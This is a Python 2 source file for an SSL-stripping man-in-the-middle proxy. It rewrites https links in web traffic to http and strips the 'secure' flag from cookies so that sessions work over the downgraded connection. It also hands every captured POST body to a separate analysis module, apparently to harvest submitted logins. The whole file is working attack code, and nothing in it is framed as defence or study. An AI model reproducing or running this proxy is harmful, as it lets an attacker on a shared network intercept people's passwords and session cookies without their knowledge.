import SocketServer

import BaseHTTPServer
import threading

import StringIO
import string
import gzip
import sys
import re

import urllib
import httplib
import base64
import urlparse
from Engine import analyzepost

HEADERTAG_HOST = 'host'
HEADERTAG_PROXYCONNECTION = 'proxy-connection'
HEADERTAG_ENCODING = 'content-encoding'
HEADERTAG_CONTENTLENGTH = 'content-length'
HEADERTAG_CONTENTTYPE = 'content-type'
HEADERTAG_LOCATION = 'location'
HEADERTAG_SETCOOKIE = 'set-cookie'
HEADERTAG_REFERER = 'referer'
HEADERTAG_CACHECONTROL = 'cache-control'
HEADERTAG_LASTMODIFIED = 'last-modified'
HEADERTAG_CONNECTION = 'connection'
HEADERTAG_KEEPALIVE = 'keep-alive'

SCHEME_HTTP = 'http'
SCHEME_HTTPS = 'https'

METHOD_POST = 'POST'
METHOD_GET = 'GET'

infologger = None



def fix_dict(d):
    nd = {}
    for key, item in d.items():
        nd[key.lower()] = item
    return nd

class CookieParser:
    """
        Unfortunately, httplib returns the cookies header oddly formatted, so they
        must be parsed in order to send them correctly to the client.
        Additionally, the 'secure' flag must be stripped in order for the session to work
        properly over the client-proxy insecure link
    """
    regex_date_pattern = re.compile('([a-zA-Z]{3}, [0-9]{2}(?: |-)[a-zA-Z]{3}(?: |-)[0-9]{4} [0-9]{2}:[0-9]{2}:[0-9]{2})')
    def __init__(self, cookie_string):
        self.set_cookie_string(cookie_string)

    @staticmethod
    def __dates_hide_comma__(cookie_string):
        cookies = cookie_string.split(';')
        #debug print cookie_string
        result = []
        for cookie in cookies:
            if 'expires=' in cookie.lower():
                match_list = CookieParser.regex_date_pattern.findall(cookie)
                #debug print match_list
                replaced = string.replace(match_list[0], ',', '${COMMA}')
                cookie = string.replace(cookie, match_list[0], replaced)

            result.append(cookie)
        #debug print ';'.join(result)
        return ';'.join(result)
    
    @staticmethod
    def __dates_unhide_comma__(cookie_string):
        return string.replace(cookie_string, '${COMMA}', ',')

    @staticmethod
    def __strip_secure_flag__(cookie):
        fields = cookie.split(';')

        for field in fields:
            if field.lower().strip() == 'secure':
                fields.remove(field)

        return ';'.join(fields)

    def set_cookie_string(self, cookie_string):
        cookie_string = CookieParser.__dates_hide_comma__(cookie_string)
        self.cookies = tuple(map(CookieParser.__dates_unhide_comma__, cookie_string.split(',')))
    
    def strip_secure_flag(self):
        self.cookies = tuple(map(CookieParser.__strip_secure_flag__, self.cookies))

    def get_cookies(self):
        return tuple(self.cookies)
    

                
    
class SSLStripper:

    regex_url_pattern = re.compile('((https((:[/\\\\]{0,8})|(%3A%2F%2F|%253A%252F%252F)))+[\w\d:#@%/;$()~_?\+-=\\\.&]*)', re.IGNORECASE)
    regex_url_ignore_quoted_pattern = re.compile('((https(:[/\\\\]{0,8}))+[\w\d:#@%/;$()~_?\+-=\\\.&]*)', re.IGNORECASE)
    find_index = 0    
    regex_http_pattern = re.compile('(https?:[/\\\\]{0,8})')

    url_db = set([])
    def stripstring(self, str_, ignore_quoted=False):
        if not ignore_quoted:
            occurrences = self.regex_url_pattern.findall(str_)
        else:
            occurrences = self.regex_url_ignore_quoted_pattern.findall(str_)

        replace_tag = 'http://'
        #print self.url_db
        for item in occurrences:
            url = item[self.find_index]
            
            if not ignore_quoted:
                mod_url = string.replace(urllib.unquote_plus(url), '\\', '')
            else:
                mod_url = string.replace(url, '\\', '')

            mod_url = self.regex_http_pattern.sub(replace_tag, mod_url)

            #debug print 'url', url, 'mod_url', mod_url

            parsed_url = urlparse.urlparse(mod_url.lower())
            target_path = parsed_url.path
            if len(target_path) < 1: target_path = '/'
            self.url_db.add(parsed_url.scheme + '://' + parsed_url.netloc + target_path)
            str_ = string.replace(str_, url, 'http' + url[5:])
        return str_

    def in_list(self, url):
        parsed_url = urlparse.urlparse(url)
        target_path = parsed_url.path
        if len(target_path) < 1: target_path = '/'
        return ((parsed_url.scheme + '://' + parsed_url.netloc + target_path).lower()  in self.url_db)
        
globalstripper = SSLStripper()
analyzeData = analyzepost.analyzePost()

class SSLProxyHTTPHandler(BaseHTTPServer.BaseHTTPRequestHandler):

    strip_server_headers_list = (HEADERTAG_LASTMODIFIED, HEADERTAG_CACHECONTROL, HEADERTAG_ENCODING, HEADERTAG_CONTENTLENGTH, HEADERTAG_CONNECTION, HEADERTAG_KEEPALIVE)
    strip_client_headers_list = (HEADERTAG_REFERER, HEADERTAG_PROXYCONNECTION, HEADERTAG_CACHECONTROL, HEADERTAG_HOST, HEADERTAG_CONNECTION, HEADERTAG_KEEPALIVE)

    http_connection = None

    def do_POST(self):
        return self.handle_connection(METHOD_POST,self.rfile.read(int(self.headers[HEADERTAG_CONTENTLENGTH])))

    def do_GET(self):
        return self.handle_connection(METHOD_GET, None)
    
    def log_message(self,*args):
	    pass

    @staticmethod
    def __strip_headers__(header_dict, header_list):
        """ Strip headers from dict using class parameters
            @header_dict: Dictionary to delete headers from
            @header_list: List of headers to delete
        """
        for header in header_list:
            if header in header_dict:
                del header_dict[header]
        return header_dict

    @staticmethod
    def __stripssl_headers__(header_dict, stripper):
        for header in header_dict:
            if header.lower() != HEADERTAG_SETCOOKIE:
                header_dict[header] = map(lambda x: stripper.stripstring(x), header_dict[header])
        return header_dict
            

    def __start_server_connection__(self, ssl, host, port):
        """ Start connection to remote server.
            @ssl: Whether connection must be done over an ssl socket
        """

        if self.http_connection is None:
            # Create connection 
            if port is not None and port > 0:
                if ssl:
                    self.http_connection = httplib.HTTPSConnection(host, port)
                else:
                    self.http_connection = httplib.HTTPConnection(host, port)
            else:
                # Use default port
                if ssl:
                    self.http_connection = httplib.HTTPSConnection(host)
                else:
                    self.http_connection = httplib.HTTPConnection(host)

            self.http_connection.connect()

    def __create_client_header_dict__(self):
        """
            Create dictionary of headers sent by the client.
        """
        header_dict = {}
        for key, item in self.headers.dict.items():
            # New dictionary contains keys in lower case and items are actually lists (Headers may appear multiple times)
            header_dict[key.lower()] = self.headers.getheaders(key)
        return header_dict

    def __create_server_header_dict__(self, response):
        header_dict = {}
        for key, item in response.getheaders():
            header_dict[key] = header_dict.get(key, [])
            header_dict[key].append(item)

        # Fix cookie parsing
        if HEADERTAG_SETCOOKIE in header_dict:
            cookie_parser = CookieParser(','.join(header_dict[HEADERTAG_SETCOOKIE]))
            cookie_parser.strip_secure_flag()
            header_dict[HEADERTAG_SETCOOKIE] = cookie_parser.get_cookies()
                
        return header_dict

    def __send_headers_to_server__(self, header_dict):
        """ Send a correctly formatted dictionary of headers to server
            @header_dict: Dictionary to send
        """
        for key, item in header_dict.items():
            for subitem in item:
                self.http_connection.putheader(key, subitem)

    def __send_headers_to_client__(self, header_dict):
        """ Send a correctly formatted dictionary of headers to client
            @header_dict: Dictionary to send
        """
        for key, item in header_dict.items():
            for subitem in item:
                self.send_header(key, subitem)
    
    def handle_connection(self, method, post_data):
        client_headers = self.__create_client_header_dict__()

        # Parse hostname
        host_data = client_headers[HEADERTAG_HOST][0].split(':')
        hostname = host_data[0]
        if len(host_data) > 1:
            port = host_data[1]
        else:
            port = None
        
        if self.path[:4].lower().strip() == 'http':
            target_path = '/' + '/'.join(self.path.split('/')[3:])
        else:
            target_path = self.path

        target_url = 'http://' + hostname + target_path

        self.__start_server_connection__(globalstripper.in_list(target_url), hostname, port)
        
        self.http_connection.putrequest(method, target_path)
        
        #debug print 'client headers', client_headers
        self.__send_headers_to_server__(SSLProxyHTTPHandler.__strip_headers__(client_headers, self.strip_client_headers_list))
        self.http_connection.putheader(HEADERTAG_CONNECTION, 'close')
        self.http_connection.endheaders()

        if post_data is not None:
            self.http_connection.send(post_data)
        
        response = self.http_connection.getresponse()

        self.send_response(response.status)

        server_headers = self.__create_server_header_dict__(response)
        #server_headers = SSLProxyHTTPHandler.__stripssl_headers__(server_headers, globalstripper)
        
        if HEADERTAG_LOCATION in server_headers:
            server_headers[HEADERTAG_LOCATION] = map(lambda x: globalstripper.stripstring(x, True), server_headers[HEADERTAG_LOCATION])

        # SSL Strip
        
        contents = response.read()
        

        # gunzip
        if HEADERTAG_ENCODING in server_headers and ('gzip' in ','.join(server_headers[HEADERTAG_ENCODING])):
            contents = gzip.GzipFile(fileobj=StringIO.StringIO(contents)).read()
        
        # URL Tampering
        
        if HEADERTAG_CONTENTTYPE in server_headers:
            if ('image' not in ','.join(server_headers[HEADERTAG_CONTENTTYPE])) and ('movie' not in ','.join(server_headers[HEADERTAG_CONTENTTYPE])):
                contents = globalstripper.stripstring(contents)

        
        
        #debug print 'server headers', server_headers
        self.__send_headers_to_client__(SSLProxyHTTPHandler.__strip_headers__(server_headers, self.strip_server_headers_list))
        self.end_headers()
        self.wfile.write(contents)
        if post_data is not None and len(post_data)>1:
            analyzeData.analyze(infologger, post_data, hostname)

            
class ThreadedHTTPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer, BaseHTTPServer.HTTPServer):

    def handle_error(self,*args):
        pass

class run_server(threading.Thread):
    def __init__(self,logger,port=1337):
        threading.Thread.__init__(self)
        global infologger
        infologger = logger
        self.port = port
        self.running = False
    def run(self):
        self.running = True
        server_class=ThreadedHTTPServer
        handler_class=SSLProxyHTTPHandler
        server_address = ('', self.port)
        self.httpd = server_class(server_address, handler_class)
        while (self.running):
            self.httpd.handle_request()
    def stop(self):
        self.running = False
        self._Thread__stop()


#aa = run_server()
#aa.running = True
#aa.start()
#time.sleep(20)
#aa.stop()




